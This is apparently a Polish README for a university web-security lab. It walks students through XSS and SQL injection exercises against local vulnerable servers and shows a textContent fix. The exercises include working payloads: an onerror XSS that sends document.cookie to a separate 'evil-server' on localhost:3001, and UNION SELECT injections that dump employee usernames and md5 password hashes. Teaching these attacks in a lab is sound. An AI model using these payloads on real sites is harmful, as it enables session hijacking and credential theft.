# BAIiM_project
Command Injection, Code Injection i Cross-Site Scripting

## Wymagania
* Git (git clone)
* Node.js
* Python 3.10 (lub nowszy)
* Docker
* Docker-compose

## Wstęp
* Sklonuj repozytorium (git clone)
* Zainstaluj pakiety Node.js zdefiniowane w `package.json` z pomocą poniższej komendy:
```
npm install
```

## Zadanie 1

* Uruchom lokalny serwer WWW za pomocą Node.js:
```
node server.js
```

To spowoduje pojawienie się komunikatu: `Serwer nasłuchuje na porcie 3000`. 
W wyszukiwarce wpisz link `http://localhost:3000/`.
* Możesz wpisać dowolną rzecz w pole tekstowe, a następnie kliknąć `Szukaj`. Sprawdź jak zachowuje się to zapytanie i czy wygląda na podatne na atak.
* Przy użyciu klawisza F12 otwórz "Developer Tools" i wklej poniższy kod do konsoli:
```
encodeURIComponent('<img src="does-not-exist" onerror="alert(\'BAIiM\')">');
```
* Następnie skopiuj wynik i wklej go do paska URL, tak aby wyglądał w następujący sposób: `http://localhost:3000/?val=<wynik>`

* W "Developer Tools" otwórz zakładkę "Application". A następnie "Storage" -> "Cookies", kliknij "localhost:3000", aby wyświetlić pliki cookies zapisane dla tej strony.

* Znajdujemy tam ciasteczko o nazwie "connect.sid". Spróbuj zyskać do niego dostęp poprzez wklejenie poniższego kodu do pola tekstowego - musisz najpierw powtórzyć krok z `encodeURIComponent` na poniższym kodzie (jako wynik powinniśmy zobaczyć zawartość w wyskakującym okienku):
 ```
<img src="does-not-exist" onerror="alert(document.cookie)">
```
* teraz uruchom kolejny serwer (w osobnym terminalu):
```
node evil-server.js
```

* teraz spróbujesz wykraść plik cookie. Wklej poniższy kod do pola tekstowego (tak jak poprzednio użyj `encodeURIComponent`)

```
<img src="does-not-exist" onerror="var img = document.createElement(\'img\'); img.src = \'http://localhost:3001/cookie?data=\' + document.cookie; document.querySelector(\'body\').appendChild(img);">
```
* zobacz wynik w terminalu, w którym uruchomiony został `evil-server.js`
* zastanów się dlaczego to, co wykonałeś powyżej może być groźne

### Zabezpieczenie
* W pliku `public/index.html` znajdź funkcję "showQueryAndResults". Pobiera ona wartość zapytania `val` i wpisuje do `<div id="results"></div>`
* Możemy zmienić ją tak, aby `val` trakowane było jako tekst. W tym celu dodaj poniższy kod na końcu funkcji "showQueryAndResults".
```
var queryTextEl = document.querySelector('#results pre');
	queryTextEl.textContent = val;
```
* zastanów się, jaki ma to wpływ

## Zadanie 2
W tym zadaniu dokonasz podstawowego ataku SQL Injection, który pozwoli Ci na dostęp do konta administratora w serwisie internetowym. Do jego wykonania wymagane jest użycie języka Python.

* W celu uruchomienia serwera przejdź do katalogu Zadanie-2
* Uruchom serwer atakowanej witryny internetowej poprzez wykonanie polecenia `python main.py`
* Przejdź do serwisu sklepu dostępnego pod adresem: http://localhost:5000
* (Opcjonalnie) zapoznaj się z zawartością tabeli dostępnych produktów - obraz "Produkty.png"

Poniżej znajduje się instrukcja dotycząca używania poleceń SQL dla ataków typu injection w bazie danych SQLite (screen tabeli dostępnych produktów znajduje się w folderze Zadanie-2):
* Sprawdź, czy atak injection może zadziałać, wpisując następujące polecenie (`sqlite_master` to domyślna tabela w bazie danych SQLite, która przechowuje informacje o każdej tabeli w bazie danych):
```
woda' UNION SELECT 1,2,3 from sqlite_master WHERE type="table"; --
```
* Uzyskaj nazwy tabel z tabeli głównej (polecenie SQL zwraca informacje o tabeli):
```
woda' UNION SELECT name,sql,3 from sqlite_master WHERE type="table"; --
```
`name` i `sql` to kolumny w tabeli `sqlite_master`. `name` zwraca nazwę tabeli, a `sql` zwraca informacje SQL dotyczące tabeli (np. kolumny).
* Uzyskaj informacje z dwóch kolumn i utwórz trzecią kolumnę:
```
woda' UNION SELECT username,password,3 from employees;--
 ```
* Zwróć uwagę, że w kolumnie `password` pojawia się ciąg znaków. Zastanów się co możesz z nim zrobić. (podpowiedź: md5).

Przeanalizuj powyższe polecenia i zastanów się skąd wynikają poszczególne ich elementy.

Dlaczego atak nie powiedzie się podając tylko złośliwe zapytanie SQL?

## Zadanie 3
Twoim ostatnim zadaniem jest samodzielne dokonanie serii ataków XSS. Wyzwanie składa się z 6 poziomów, w ramach których należy ominąć zaimplementowane zabezpieczenia.


W celu uruchomienia serwera wykonaj poniższe kroki:
* Zainstaluj program [docker](https://docs.docker.com/get-docker/) oraz [docker-compose](https://docs.docker.com/compose/install/).
* Przejdź do katalogu Zadanie-3 (folder zawierający plik docker-compose.yml)
* Wykonaj polecenie `sudo docker-compose up`
* Przejdź do wyzwań dostępnych pod adresem: http://localhost:9003


Jeśli podczas wykonywania polecenia `docker-compose up` napotkasz problemy upewnij się, że usługa docker'a została uruchomiona. W przeciwnym wypadku wykonaj polecenie `sudo systemctl start docker`.

Jeżeli problem nadal występuje, należy całkowicie zresetować pracę usługi poprzez polecenie `sudo systemctl restart docker`.


## Bibliografia
* "Bezpieczeństwo aplikacji webowych" - Michał Bentkowski, Gynvael Coldwind, Artur Czyż, Rafał Janicki, Jarosław Kamiński, Adrian Michalczyk, Mateusz Niezabitowski, Marcin Piosek, Michał Sajdak, Grzegorz Trawiński, Bohdan Widła
* https://crashtest-security.com/different-injection-attack-types/​
* https://learn.snyk.io/lessons/​
* https://www.imperva.com/learn/application-security/command-injection/​
* https://owasp.org/www-community/attacks/Command_Injection​
* https://crashtest-security.com/command-injection/​
* https://crashtest-security.com/code-injection/​
* https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html​
* https://www.acunetix.com/websitesecurity/cross-site-scripting/ 
* https://www.acunetix.com/blog/web-security-zone/test-xss-skills-vulnerable-sites/
* https://github.com/inforkgodara/xss-vulnerability 
* https://github.com/neophyt3/sql-injection-exercises

  ### Dodatkowe
  #### Gry XSS i zadania:
  * http://sudo.co.il/xss/
  * https://xss-game.appspot.com/ 
  * https://alf.nu/alert1?world=alert&level=alert0 
  * http://prompt.ml/0 
  * https://xss-quiz.int21h.jp/
  * https://domgo.at/cxss/example

  #### Animacja o XSS wraz z wyjaśnieniem
  * https://www.hacksplaining.com/exercises/xss-stored (animacja)
  * https://www.hacksplaining.com/prevention/xss-stored (wyjaśnienie)
